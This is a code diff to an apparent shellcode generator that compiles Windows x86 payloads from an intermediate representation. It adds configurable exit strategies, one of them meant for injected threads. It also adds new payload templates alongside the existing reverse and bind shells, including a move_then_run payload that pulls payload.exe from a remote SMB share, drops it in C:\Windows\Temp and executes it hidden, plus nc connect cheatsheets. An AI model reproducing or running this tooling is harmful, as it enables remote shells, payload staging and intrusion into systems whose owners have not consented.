@@ -11,6 +11,10 @@ Reference workflows:
     with typed inputs (lhost, lport), struct init, and error branching
   - bind_shell: WSAStartup, WSASocketA, bind, listen, accept,
     CreateProcessA with typed lport, struct init, and error branching
+  - copy_file: CopyFileA with configurable source and dest paths
+  - copy_then_run: CopyFileA followed by WinExec
+  - move_then_run: MoveFileA followed by WinExec
+  - check_path: GetFileAttributesA to test file existence
 """
 from __future__ import annotations
 
@@ -29,7 +33,9 @@ from .ir import (
     Compare,
     ConstructString,
     DefineConstant,
+    ExitStrategy,
     Immediate,
+    Jump,
     NameRef,
     SuccessPredicate,
     Terminate,
@@ -41,6 +47,83 @@ from .ir import (
 )
 from .validator import validate
 from .x86_backend import lower_workflow
+
+# GetCurrentProcess() returns the pseudo-handle (HANDLE)-1 = 0xFFFFFFFF.
+# We use the well-known constant directly to avoid an extra API resolution.
+_CURRENT_PROCESS_HANDLE = 0xFFFFFFFF
+
+
+def _make_exit_blocks(
+    strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> tuple[Block, Block]:
+    """Build reusable success/fail terminal blocks for the given exit strategy.
+
+    EXIT_PROCESS:      ExitProcess(0) / ExitProcess(1)
+    TERMINATE_PROCESS: TerminateProcess(GetCurrentProcess(), 0/1)
+    THREAD_ONLY:       just hang (no process exit, useful for injected threads)
+    """
+    if strategy == ExitStrategy.EXIT_PROCESS:
+        return (
+            Block("success", (
+                CallAPI("ExitProcess", arguments=(Immediate(0),)),
+                Terminate(TerminateStyle.HANG),
+            )),
+            Block("fail", (
+                CallAPI("ExitProcess", arguments=(Immediate(1),)),
+                Terminate(TerminateStyle.HANG),
+            )),
+        )
+
+    if strategy == ExitStrategy.TERMINATE_PROCESS:
+        return (
+            Block("success", (
+                CallAPI(
+                    "TerminateProcess",
+                    arguments=(
+                        Immediate(_CURRENT_PROCESS_HANDLE),
+                        Immediate(0),
+                    ),
+                ),
+                Terminate(TerminateStyle.HANG),
+            )),
+            Block("fail", (
+                CallAPI(
+                    "TerminateProcess",
+                    arguments=(
+                        Immediate(_CURRENT_PROCESS_HANDLE),
+                        Immediate(1),
+                    ),
+                ),
+                Terminate(TerminateStyle.HANG),
+            )),
+        )
+
+    # THREAD_ONLY: no process termination
+    return (
+        Block("success", (
+            Terminate(TerminateStyle.HANG),
+        )),
+        Block("fail", (
+            Terminate(TerminateStyle.HANG),
+        )),
+    )
+
+
+def _exit_api_name(strategy: ExitStrategy) -> str | None:
+    """Return the API name the exit strategy requires, or None."""
+    if strategy == ExitStrategy.EXIT_PROCESS:
+        return "ExitProcess"
+    if strategy == ExitStrategy.TERMINATE_PROCESS:
+        return "TerminateProcess"
+    return None
+
+
+def _parse_exit_strategy(value: str) -> ExitStrategy:
+    """Convert a config string to ExitStrategy enum."""
+    try:
+        return ExitStrategy(value)
+    except ValueError:
+        return ExitStrategy.EXIT_PROCESS
 
 
 class WorkflowTemplate(PayloadTemplate):
@@ -54,20 +137,22 @@ class WorkflowTemplate(PayloadTemplate):
                 + "\n".join(f"  - {e}" for e in result.errors)
             )
         self._workflow = workflow
-        self._slot_names: list[str] | None = None
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        """Return the workflow to use for a given config.
+
+        Subclasses that rebuild the workflow (e.g. for exit strategy)
+        override this. The base implementation returns the static workflow.
+        """
+        return self._workflow
 
     def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
-        return lower_workflow(self._workflow, layout, config.badchars, config)
+        return lower_workflow(
+            self._resolve_workflow(config), layout, config.badchars, config,
+        )
 
-    def probe_slots(self, config: TemplateConfig) -> list[str]:
-        """Extract all slot names the workflow needs from the IR directly.
-
-        This replaces RecordingLayout-based inference with explicit
-        analysis of the IR operations.
-        """
-        if self._slot_names is not None:
-            return self._slot_names
-
+    def _extract_slots(self, workflow: Workflow) -> list[str]:
+        """Extract all slot names from a workflow's IR operations."""
         seen: set[str] = set()
         ordered: list[str] = []
 
@@ -76,7 +161,7 @@ class WorkflowTemplate(PayloadTemplate):
                 seen.add(name)
                 ordered.append(name)
 
-        for block in self._workflow.blocks:
+        for block in workflow.blocks:
             for op in block.operations:
                 if isinstance(op, CallAPI):
                     _add(op.api_name)
@@ -100,22 +185,27 @@ class WorkflowTemplate(PayloadTemplate):
                 elif isinstance(op, (DefineConstant,)):
                     pass
 
-        self._slot_names = ordered
         return ordered
 
-    def probe_strings(self) -> dict[str, str]:
+    def probe_slots(self, config: TemplateConfig) -> list[str]:
+        """Extract all slot names the workflow needs from the IR directly."""
+        return self._extract_slots(self._resolve_workflow(config))
+
+    def probe_strings(self, config: TemplateConfig | None = None) -> dict[str, str]:
         """Return {label: value} for all ConstructString operations in the IR."""
+        wf = self._resolve_workflow(config or TemplateConfig())
         result: dict[str, str] = {}
-        for block in self._workflow.blocks:
+        for block in wf.blocks:
             for op in block.operations:
                 if isinstance(op, ConstructString):
                     result[op.name] = op.value
         return result
 
-    def probe_structs(self) -> dict[str, str]:
+    def probe_structs(self, config: TemplateConfig | None = None) -> dict[str, str]:
         """Return {name: struct_type} for all AllocateStruct operations."""
+        wf = self._resolve_workflow(config or TemplateConfig())
         result: dict[str, str] = {}
-        for block in self._workflow.blocks:
+        for block in wf.blocks:
             for op in block.operations:
                 if isinstance(op, AllocateStruct):
                     result[op.name] = op.struct_type
@@ -137,11 +227,15 @@ class WorkflowTemplate(PayloadTemplate):
 # ---------------------------------------------------------------------------
 
 
-def build_run_command_workflow(command: str = "calc.exe") -> Workflow:
+def build_run_command_workflow(
+    command: str = "calc.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
     """Build the run_command reference workflow.
 
-    WinExec(command, SW_HIDE=0) -> branch on result -> ExitProcess
+    WinExec(command, SW_HIDE=0) -> branch on result -> exit
     """
+    success, fail = _make_exit_blocks(exit_strategy)
     return Workflow(
         name="ir_run_command",
         blocks=(
@@ -159,14 +253,8 @@ def build_run_command_workflow(command: str = "calc.exe") -> Workflow:
                     false_block="fail",
                 ),
             )),
-            Block("success", (
-                CallAPI("ExitProcess", arguments=(Immediate(0),)),
-                Terminate(TerminateStyle.HANG),
-            )),
-            Block("fail", (
-                CallAPI("ExitProcess", arguments=(Immediate(1),)),
-                Terminate(TerminateStyle.HANG),
-            )),
+            success,
+            fail,
         ),
         entry="entry",
     )
@@ -178,10 +266,10 @@ class IRRunCommandTemplate(WorkflowTemplate):
     def __init__(self) -> None:
         super().__init__(build_run_command_workflow())
 
-    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
         command = config.command or "calc.exe"
-        workflow = build_run_command_workflow(command)
-        return lower_workflow(workflow, layout, config.badchars, config)
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_run_command_workflow(command, exit_strategy=strategy)
 
     def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
         return [
@@ -202,6 +290,7 @@ def build_reverse_shell_workflow(
     lhost: str = "127.0.0.1",
     lport: int = 4444,
     command: str = "cmd.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
 ) -> Workflow:
     """Build the reverse_shell reference workflow.
 
@@ -318,15 +407,7 @@ def build_reverse_shell_workflow(
                         true_block="success", false_block="fail"),
             )),
 
-            Block("success", (
-                CallAPI("ExitProcess", arguments=(Immediate(0),)),
-                Terminate(TerminateStyle.HANG),
-            )),
-
-            Block("fail", (
-                CallAPI("ExitProcess", arguments=(Immediate(1),)),
-                Terminate(TerminateStyle.HANG),
-            )),
+            *_make_exit_blocks(exit_strategy),
         ),
         entry="entry",
     )
@@ -338,13 +419,14 @@ class IRReverseShellTemplate(WorkflowTemplate):
     def __init__(self) -> None:
         super().__init__(build_reverse_shell_workflow())
 
-    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
-        workflow = build_reverse_shell_workflow(
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_reverse_shell_workflow(
             lhost=config.lhost,
             lport=config.lport,
             command=config.command or "cmd.exe",
+            exit_strategy=strategy,
         )
-        return lower_workflow(workflow, layout, config.badchars, config)
 
     def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
         return [
@@ -363,6 +445,7 @@ _INADDR_ANY = 0  # 0.0.0.0
 def build_bind_shell_workflow(
     lport: int = 4444,
     command: str = "cmd.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
 ) -> Workflow:
     """Build the bind_shell reference workflow.
 
@@ -496,15 +579,7 @@ def build_bind_shell_workflow(
                         true_block="success", false_block="fail"),
             )),
 
-            Block("success", (
-                CallAPI("ExitProcess", arguments=(Immediate(0),)),
-                Terminate(TerminateStyle.HANG),
-            )),
-
-            Block("fail", (
-                CallAPI("ExitProcess", arguments=(Immediate(1),)),
-                Terminate(TerminateStyle.HANG),
-            )),
+            *_make_exit_blocks(exit_strategy),
         ),
         entry="entry",
     )
@@ -516,15 +591,303 @@ class IRBindShellTemplate(WorkflowTemplate):
     def __init__(self) -> None:
         super().__init__(build_bind_shell_workflow())
 
-    def emit(self, layout: StackLayout, config: TemplateConfig) -> str:
-        workflow = build_bind_shell_workflow(
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_bind_shell_workflow(
             lport=config.lport,
             command=config.command or "cmd.exe",
+            exit_strategy=strategy,
         )
-        return lower_workflow(workflow, layout, config.badchars, config)
 
     def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
         return [
             ("Connect to bind shell", f"nc -nv <TARGET_IP> {config.lport}"),
             ("Connect (rlwrap)", f"rlwrap nc -nv <TARGET_IP> {config.lport}"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Copy file workflow
+# ---------------------------------------------------------------------------
+
+
+def build_copy_file_workflow(
+    src_path: str = r"C:\source.txt",
+    dst_path: str = r"C:\dest.txt",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the copy_file reference workflow.
+
+    CopyFileA(src, dst, FALSE) -> branch on result -> exit
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_copy_file",
+        blocks=(
+            Block("entry", (
+                ConstructString("src_path", src_path),
+                ConstructString("dst_path", dst_path),
+                CallAPI(
+                    "CopyFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dst_path"),
+                        Immediate(0),  # bFailIfExists = FALSE
+                    ),
+                    result="copy_ret",
+                ),
+                Compare(
+                    "copy_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRCopyFileTemplate(WorkflowTemplate):
+    """IR-backed copy_file template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_copy_file_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_copy_file_workflow(
+            src_path=config.src_path or r"C:\source.txt",
+            dst_path=config.dst_path or r"C:\dest.txt",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Source path", config.src_path or r"C:\source.txt"),
+            ("Destination path", config.dst_path or r"C:\dest.txt"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Copy then run workflow
+# ---------------------------------------------------------------------------
+
+
+def build_copy_then_run_workflow(
+    src_path: str = r"C:\source\payload.exe",
+    dst_path: str = r"C:\Windows\Temp\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the copy_then_run reference workflow.
+
+    CopyFileA(src, dst, FALSE) -> WinExec(dst, SW_HIDE) -> exit
+
+    dst_path is both the copy destination and the command line.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_copy_then_run",
+        blocks=(
+            Block("entry", (
+                ConstructString("src_path", src_path),
+                ConstructString("dst_path", dst_path),
+                CallAPI(
+                    "CopyFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dst_path"),
+                        Immediate(0),  # bFailIfExists = FALSE
+                    ),
+                    result="copy_ret",
+                ),
+                Compare(
+                    "copy_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="run_payload",
+                    false_block="fail",
+                ),
+            )),
+            Block("run_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dst_path"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRCopyThenRunTemplate(WorkflowTemplate):
+    """IR-backed copy_then_run template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_copy_then_run_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_copy_then_run_workflow(
+            src_path=config.src_path or r"C:\source\payload.exe",
+            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Source path", config.src_path or r"C:\source\payload.exe"),
+            ("Destination path (also executed)",
+             config.dst_path or r"C:\Windows\Temp\payload.exe"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Move then run workflow
+# ---------------------------------------------------------------------------
+
+
+def build_move_then_run_workflow(
+    src_path: str = r"\\192.168.1.10\kalismb\payload.exe",
+    dst_path: str = r"C:\Windows\Temp\payload.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the move_then_run reference workflow.
+
+    MoveFileA(src, dst) -> WinExec(dst, SW_HIDE) -> exit
+
+    dst_path is both the move destination and the command line.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_move_then_run",
+        blocks=(
+            Block("entry", (
+                ConstructString("src_path", src_path),
+                ConstructString("dst_path", dst_path),
+                CallAPI(
+                    "MoveFileA",
+                    arguments=(
+                        AddressOf("src_path"),
+                        AddressOf("dst_path"),
+                    ),
+                    result="move_ret",
+                ),
+                Compare(
+                    "move_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="run_payload",
+                    false_block="fail",
+                ),
+            )),
+            Block("run_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dst_path"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare(
+                    "exec_ret",
+                    SuccessPredicate.NONZERO,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRMoveThenRunTemplate(WorkflowTemplate):
+    """IR-backed move_then_run template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_move_then_run_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_move_then_run_workflow(
+            src_path=config.src_path or r"\\192.168.1.10\kalismb\payload.exe",
+            dst_path=config.dst_path or r"C:\Windows\Temp\payload.exe",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        return [
+            ("Source path (moved, not copied)",
+             config.src_path or r"\\192.168.1.10\kalismb\payload.exe"),
+            ("Destination path (also executed)",
+             config.dst_path or r"C:\Windows\Temp\payload.exe"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Check path workflow
+# ---------------------------------------------------------------------------
+
+
+def build_check_path_workflow(
+    check_path: str = r"C:\Windows\System32\cmd.exe",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the check_path reference workflow.
+
+    GetFileAttributesA(path) -> branch on INVALID_FILE_ATTRIBUTES -> exit
+
+    Success (file exists) exits with code 0, failure with code 1.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_check_path",
+        blocks=(
+            Block("entry", (
+                ConstructString("check_path", check_path),
+                CallAPI(
+                    "GetFileAttributesA",
+                    arguments=(AddressOf("check_path"),),
+                    result="path_attrs",
+                ),
+                Compare(
+                    "path_attrs",
+                    SuccessPredicate.INVALID_HANDLE,
+                    true_block="success",
+                    false_block="fail",
+                ),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRCheckPathTemplate(WorkflowTemplate):
+    """IR-backed check_path template for CLI integration."""
+
+    def __init__(self) -> None:
+        super().__init__(build_check_path_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        path = config.dst_path or r"C:\Windows\System32\cmd.exe"
+        return build_check_path_workflow(path, exit_strategy=strategy)
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        path = config.dst_path or r"C:\Windows\System32\cmd.exe"
+        return [
+            ("Path checked", path),
+            ("Exit code 0 if path exists", ""),
+            ("Exit code 1 if path missing", ""),
         ]
